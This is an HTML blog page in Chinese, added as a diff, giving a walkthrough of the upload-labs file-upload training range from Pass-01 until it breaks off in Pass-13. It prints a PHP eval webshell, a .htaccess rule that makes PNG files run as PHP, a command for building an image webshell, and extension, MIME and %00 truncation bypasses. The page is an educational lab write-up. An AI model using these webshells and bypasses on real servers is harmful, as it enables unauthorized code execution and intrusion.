@@ -1,0 +1,1031 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="chiya-66">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Pass-01知识点：前端 JS 校验漏洞 防护原理：仅在浏览器端通过 JS 代码校验文件后缀，后端无任何校验。  核心特征：点击上传按钮就弹出”不支持该文件类型”提示  绕过方法：  浏览器禁用 JavaScript  先上传合法 .jpg 文件，抓包修改后缀为 .php。文件内容直接为一句话木马即可： 1&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&amp;gt">
+<meta property="og:type" content="article">
+<meta property="og:title" content="upload-labs全靶场通关教程（超全超详细！适用于零基础）">
+<meta property="og:url" content="https://chiya-66.github.io/2026/08/07/upload-labs%E5%85%A8%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/index.html">
+<meta property="og:site_name" content="Chiya 的博客">
+<meta property="og:description" content="Pass-01知识点：前端 JS 校验漏洞 防护原理：仅在浏览器端通过 JS 代码校验文件后缀，后端无任何校验。  核心特征：点击上传按钮就弹出”不支持该文件类型”提示  绕过方法：  浏览器禁用 JavaScript  先上传合法 .jpg 文件，抓包修改后缀为 .php。文件内容直接为一句话木马即可： 1&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&amp;gt">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/d3bcd3482d104eefb15006131af56de4.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/a8004b44f13743d2a0d66de541967859.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/7e8a5890285a41879b93cb39b72dda1d.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/bd31f4f8c79141438c806bf4728eea59.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/70484f0648334bebb135b57021d46ea1.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/f63cc478691b4ca09d08f53d9438b930.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/938bcec3ba994157b32a042b26357e4b.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/8336003d3a294fdf85cc02f5507c1f7a.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/64bce67b9874449db9be6bea69126008.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/7238e06c897b4a17a5268794172046bf.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/e9022a77de454e7097b09e80aef9f111.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/b7c68f364b47497c9a9066a200afee9e.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/27d95f1ffc5c48289e2c781940d85130.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/6c55eceb9b0a4f44b6103a11bf3a9792.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/66bffa233e304de29e329831dcf8f069.jpeg">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/6403158e32c3475f8f6c34bec500ccf9.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/d1fa85d3f76648d9bd040696689e08f1.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/04fa33975c8f477581b30d0eac2fc57c.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/adbabc2ead5b4c4e9e5c94c2830d2cec.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/e8f4eeca268746be99c4ce673bec4f60.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/03b7f074bc0940d2a786612e8cd8fe49.jpeg">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/01d7d5d6ddfe4a8284a65ae936cd2b59.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/6bb481d8b9114870b43e196392797d15.jpeg">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/20c2c30ab2c54769957b8b3106f9f506.jpeg">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/1a05dc1dd92748b7a8b4b9a4ebab6870.jpeg">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/59a7994ff29e46dc8f0f56ee656ae973.jpeg">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/70509e75dac6482a820c9dca70336e4a.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/9adb7b46f539493792018685db9cd9c3.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/d457394659de4ecdb998df2ace35c968.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/b78beb49602e4958b51af62484345609.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/08dcce0db9094809851ae39859cdc76e.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/11755e2b38a840a29add8978b5d42e2c.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/2d27f83180d64c0ba6a68b4e11dcab85.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/1b9a7dc9ae1649be9cce4308fc688291.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/674b713f47b3455ea3c95463a092583d.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/8338b51e057b417c9c60c1ef686df3a0.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/f5393a2af48b4a2bb7a9e2bc1c531c7b.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/443f6a37ad774bb5be70f1df2ae86a7d.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/b9c549ce0548464592a8ea5205dab39a.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/3c484e96995b4d90ad0a1f4982710af2.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/ec214c3565674a3aa372674fdddd846b.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/0a02889606b4443091e182f07d60f799.jpeg">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/2a6b65e95e914c379785757071fbb1c7.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/b99bb1c5e5ac44698d1e8c2e5becf53f.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/csdn/163567978/d11823c3864d4f66bd8a0b33b949f994.png">
+<meta property="article:published_time" content="2026-08-07T13:37:18.000Z">
+<meta property="article:modified_time" content="2026-11-07T11:18:32.725Z">
+<meta property="article:author" content="chiya-66">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="upload-labs">
+<meta property="article:tag" content="文件上传">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://chiya-66.github.io/images/csdn/163567978/d3bcd3482d104eefb15006131af56de4.png">
+  
+  
+  
+  <title>upload-labs全靶场通关教程（超全超详细！适用于零基础） - Chiya 的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"chiya-66.github.io","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Chiya 的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="upload-labs全靶场通关教程（超全超详细！适用于零基础）"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-08-07 21:37" pubdate>
+          2026年8月7日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          29 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">upload-labs全靶场通关教程（超全超详细！适用于零基础）</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><h3 id="知识点：前端-JS-校验漏洞"><a href="#知识点：前端-JS-校验漏洞" class="headerlink" title="知识点：前端 JS 校验漏洞"></a>知识点：前端 JS 校验漏洞</h3><ul>
+<li><p><strong>防护原理</strong>：仅在浏览器端通过 JS 代码校验文件后缀，后端无任何校验。</p>
+</li>
+<li><p><strong>核心特征</strong>：点击上传按钮就弹出”不支持该文件类型”提示</p>
+</li>
+<li><p><strong>绕过方法</strong>：</p>
+<ol>
+<li><p>浏览器禁用 JavaScript</p>
+</li>
+<li><p>先上传合法 <code>.jpg</code> 文件，抓包修改后缀为 <code>.php</code>。文件内容直接为一句话木马即可：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>如果只是打靶场的话，一句话木马也可用 <code>&lt;?php phpinfo(); ?&gt;</code> 代替。</p>
+</li>
+</ol>
+</li>
+</ul>
+<h3 id="这里我为大家展示第2种绕过方式："><a href="#这里我为大家展示第2种绕过方式：" class="headerlink" title="这里我为大家展示第2种绕过方式："></a>这里我为大家展示第2种绕过方式：</h3><p>先上传 shell .png，里面写一句话木马即可<br><img src="/images/csdn/163567978/d3bcd3482d104eefb15006131af56de4.png" srcset="/img/loading.gif" lazyload><br>然后抓包，修改.png为.php<br><img src="/images/csdn/163567978/a8004b44f13743d2a0d66de541967859.png" srcset="/img/loading.gif" lazyload><br>成功上传，并让shell.php执行指令<br><img src="/images/csdn/163567978/7e8a5890285a41879b93cb39b72dda1d.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><h3 id="知识点：MIME-类型校验漏洞"><a href="#知识点：MIME-类型校验漏洞" class="headerlink" title="知识点：MIME 类型校验漏洞"></a>知识点：MIME 类型校验漏洞</h3><ul>
+<li><strong>防护原理</strong>：后端仅校验 HTTP 请求头中的 <code>Content-Type</code> 字段，不校验文件后缀和内容。</li>
+<li><strong>核心特征</strong>：上传 <code>.php</code> 文件被拦截，上传 <code>.jpg</code>&#x2F;<code>.png</code> 正常，抓包可见 <code>Content-Type</code> 字段。</li>
+<li><strong>绕过方法</strong>：抓包修改 <code>Content-Type</code> 为 <code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code>。</li>
+</ul>
+<h3 id="绕过步骤："><a href="#绕过步骤：" class="headerlink" title="绕过步骤："></a>绕过步骤：</h3><p>与第一关步骤类似，只需注意把<code>Content-Type</code>也进行一并修改即可<br><img src="/images/csdn/163567978/bd31f4f8c79141438c806bf4728eea59.png" srcset="/img/loading.gif" lazyload><br>即可上传成功<br><img src="/images/csdn/163567978/70484f0648334bebb135b57021d46ea1.png" srcset="/img/loading.gif" lazyload>复制图片链接并访问，即可执行成功</p>
+<h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><h3 id="后缀黑名单校验漏洞"><a href="#后缀黑名单校验漏洞" class="headerlink" title="后缀黑名单校验漏洞"></a>后缀黑名单校验漏洞</h3><ul>
+<li><p><strong>防护原理</strong>：服务器列出禁止上传的脚本后缀黑名单（如 <code>.php</code>、<code>.asp</code>、<code>.jsp</code>）。</p>
+</li>
+<li><p><strong>核心特征</strong>：提示”禁止上传 php 等脚本文件”，非黑名单后缀可上传。</p>
+</li>
+<li><p><strong>绕过方法</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>方式</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>特殊后缀</strong></td>
+<td><code>.php3</code>&#x2F;<code>.php4</code>&#x2F;<code>.php5</code>&#x2F;<code>.phtml</code>（Apache 解析）</td>
+</tr>
+<tr>
+<td><strong>大小写绕过</strong></td>
+<td><code>.pHp</code>&#x2F;<code>.PHP</code>（Windows 环境生效）</td>
+</tr>
+<tr>
+<td><strong>特殊符号</strong></td>
+<td><code>.php</code> （空格）、<code>.php.</code>（末尾点）、<code>php. .</code></td>
+</tr>
+<tr>
+<td><strong>空字节截断</strong></td>
+<td><code>.php%00.jpg</code>（PHP &lt; 5.3.4）</td>
+</tr>
+<tr>
+<td><strong><code>::$DATA</code> 绕过</strong></td>
+<td>Windows 文件流特性，抓包在后缀后加 <code>::$DATA</code>（建立连接时需删除）</td>
+</tr>
+<tr>
+<td><strong>双写绕过</strong></td>
+<td>有些服务器会将黑名单后缀删除，可使用双写（如 <code>.pphphp</code>）绕过</td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+<p><strong>本关我们利用Apache 解析的特性，通过特殊后缀进行绕过</strong></p>
+<p>抓包，然后修改后缀为.phtml即可<br><img src="/images/csdn/163567978/f63cc478691b4ca09d08f53d9438b930.png" srcset="/img/loading.gif" lazyload><br>放包，然后成功访问<br><img src="/images/csdn/163567978/938bcec3ba994157b32a042b26357e4b.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><h3 id="配置文件解析漏洞"><a href="#配置文件解析漏洞" class="headerlink" title="配置文件解析漏洞"></a>配置文件解析漏洞</h3><ul>
+<li><strong>防护原理</strong>：黑名单过滤极严，禁止所有脚本后缀（<code>.php</code>），但允许上传 <code>.htaccess</code>&#x2F;<code>web.config</code> —— Apache&#x2F;IIS 服务器的”局部配置文件”。</li>
+<li><strong>相关知识点</strong>：配置文件是服务器&#x2F;PHP 的行为规则文件。攻击文件上传，本质就是在利用这些规则的漏洞。</li>
+</ul>
+<blockquote>
+<p><strong>注：</strong> <code>.htaccess</code> 是 Apache 服务器的分布式配置文件，可以放在网站任意目录下，用来重写 URL、修改 MIME 类型、设置访问权限、解析规则等，相当于给当前目录单独写了一份 Apache 配置。</p>
+</blockquote>
+<ul>
+<li><p><strong>核心特征</strong>：所有脚本后缀均被拦截，可上传非脚本格式文件。</p>
+</li>
+<li><p><strong>绕过方法</strong>：</p>
+<p><strong>Apache：上传 <code>.htaccess</code>，再传一句话木马</strong></p>
+<p>先建立一个 <code>.htaccess</code> 文件，内容如下：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SetHandler</span> application/x-httpd-php .png<br></code></pre></td></tr></table></figure>
+
+<p>这会将当前目录下所有png文件指定为 PHP 方式处理。然后先上传文件.htaccess，再上传木马,木马为png格式直接上传即可<br><img src="/images/csdn/163567978/8336003d3a294fdf85cc02f5507c1f7a.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+</ul>
+<h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>本关与第3关一样，也是黑名单漏洞，通过代码审计可知，本关并没有进行小写转换，也就是说可以通过大小写进行绕过</p>
+<ul>
+<li><strong>绕过方法</strong>：将后缀改成.PHP即可<br><img src="/images/csdn/163567978/64bce67b9874449db9be6bea69126008.png" srcset="/img/loading.gif" lazyload></li>
+</ul>
+<h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p>同样黑名单，还是通过观察源码，了解到并没有去空，所以我们可以通过空格进行绕过</p>
+<ul>
+<li><strong>绕过方法</strong>：同样先bp进行抓包，然后进行留空</li>
+</ul>
+<p><img src="/images/csdn/163567978/7238e06c897b4a17a5268794172046bf.png" srcset="/img/loading.gif" lazyload><br>然后放包并成功访问<br><img src="/images/csdn/163567978/e9022a77de454e7097b09e80aef9f111.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p>黑名单漏洞，观察 源代码 ，发现并没有进行删除文件名末尾的点</p>
+<ul>
+<li><strong>绕过方法</strong>：先bp进行抓包，然后加上一点.<br><img src="/images/csdn/163567978/b7c68f364b47497c9a9066a200afee9e.png" srcset="/img/loading.gif" lazyload><br>然后放包并成功访问<br><img src="/images/csdn/163567978/27d95f1ffc5c48289e2c781940d85130.png" srcset="/img/loading.gif" lazyload></li>
+</ul>
+<h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p>同样查看源代码，发现少了去除字符串，所以我们可以进行::$DATA 绕过</p>
+<ul>
+<li><strong>绕过方法</strong>：先bp进行抓包，然后添加字符串::$DATA<br><img src="/images/csdn/163567978/6c55eceb9b0a4f44b6103a11bf3a9792.png" srcset="/img/loading.gif" lazyload><br>然后进行访问，并去掉字符串部分<br><img src="/images/csdn/163567978/66bffa233e304de29e329831dcf8f069.jpeg" srcset="/img/loading.gif" lazyload><br><img src="/images/csdn/163567978/6403158e32c3475f8f6c34bec500ccf9.png" srcset="/img/loading.gif" lazyload></li>
+</ul>
+<h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p>观察源代码，这里我们可以通过. .来让系统“懵逼”，从而实现绕过的目的</p>
+<ul>
+<li><strong>绕过方法</strong>：bp进行抓包，修改后缀，添加字符. .<br><img src="/images/csdn/163567978/d1fa85d3f76648d9bd040696689e08f1.png" srcset="/img/loading.gif" lazyload><br><img src="/images/csdn/163567978/04fa33975c8f477581b30d0eac2fc57c.png" srcset="/img/loading.gif" lazyload></li>
+</ul>
+<h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p>本关的特性是会将黑名单内容直接进行删除，所以我们可以通过双写来进行绕过</p>
+<ul>
+<li><strong>绕过方法</strong>：bp进行抓包，修改后缀为.pphphp<br><img src="/images/csdn/163567978/adbabc2ead5b4c4e9e5c94c2830d2cec.png" srcset="/img/loading.gif" lazyload><br>上传成功，并成功进行访问</li>
+</ul>
+<h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><h3 id="后缀白名单校验漏洞"><a href="#后缀白名单校验漏洞" class="headerlink" title="后缀白名单校验漏洞"></a>后缀白名单校验漏洞</h3><ul>
+<li><p><strong>防护原理</strong>：仅允许指定后缀（如 <code>.jpg</code>&#x2F;<code>.png</code>&#x2F;<code>.gif</code>），其余后缀全部拒绝。</p>
+</li>
+<li><p><strong>核心特征</strong>：只有白名单内文件可上传，脚本后缀一律拦截，防护性较强。</p>
+</li>
+<li><p><strong>绕过方法</strong>：</p>
+<p><strong>a. %00 截断</strong></p>
+<p>与黑名单中的 <code>%00</code> 截断原理相同。白名单只校验后缀是否为 <code>.jpg</code>，但通过 <code>%00</code> 截断使服务端实际保存为 <code>.php</code>。例如：<code>shell.php%001.jpg</code>，前端看到 <code>.jpg</code> 通过白名单，服务端截断后保存为 <code>shell.php</code>。</p>
+<p><strong>b. 配合文件包含漏洞执行图片马</strong></p>
+<p>命名时使用正常图片的命名方式（如 <code>shell.jpg</code>），文件内容则带有 PHP 指令，然后通过文件包含漏洞来激活执行（详见”文件包含漏洞”小节）。</p>
+</li>
+</ul>
+<p><strong>本关则是get形式的白名单绕过:</strong><br>同样，先上传png文件，然后上传时 bp 拦截并修改上传路径<br><img src="/images/csdn/163567978/e8f4eeca268746be99c4ce673bec4f60.png" srcset="/img/loading.gif" lazyload><br>上传成功后复制地址进行访问<br><img src="/images/csdn/163567978/03b7f074bc0940d2a786612e8cd8fe49.jpeg" srcset="/img/loading.gif" lazyload><br><img src="/images/csdn/163567978/01d7d5d6ddfe4a8284a65ae936cd2b59.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p>不同于11关，本关是 Post类型，所以我们需要在包体中进行操作</p>
+<ul>
+<li><strong>绕过方法：</strong> bp抓包，然后在包体中添加%00进行截断，然后对其进行url编码<br><img src="/images/csdn/163567978/6bb481d8b9114870b43e196392797d15.jpeg" srcset="/img/loading.gif" lazyload><br><img src="/images/csdn/163567978/20c2c30ab2c54769957b8b3106f9f506.jpeg" srcset="/img/loading.gif" lazyload><br><img src="/images/csdn/163567978/1a05dc1dd92748b7a8b4b9a4ebab6870.jpeg" srcset="/img/loading.gif" lazyload><br><img src="/images/csdn/163567978/59a7994ff29e46dc8f0f56ee656ae973.jpeg" srcset="/img/loading.gif" lazyload><br>成功上传后，复制路径，还是把php后面的部分给删掉，最终成功如图所示<br><img src="/images/csdn/163567978/70509e75dac6482a820c9dca70336e4a.png" srcset="/img/loading.gif" lazyload></li>
+</ul>
+<h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p>本关我们需要使用 图片马 配合文件上传，这里我来教大家制作图片马<br><img src="/images/csdn/163567978/9adb7b46f539493792018685db9cd9c3.png" srcset="/img/loading.gif" lazyload><br>这里需要大家同时准备一个正常图片和一个一句话木马的php文件，然后放在同一 文件夹 下，之后对该文件夹输入指令cmd，并执行以下指令</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">copy <span class="hljs-number">11</span><span class="hljs-selector-class">.png</span> /<span class="hljs-selector-tag">b</span> + shell<span class="hljs-selector-class">.php</span> /<span class="hljs-selector-tag">a</span> webshell.png<br></code></pre></td></tr></table></figure>
+
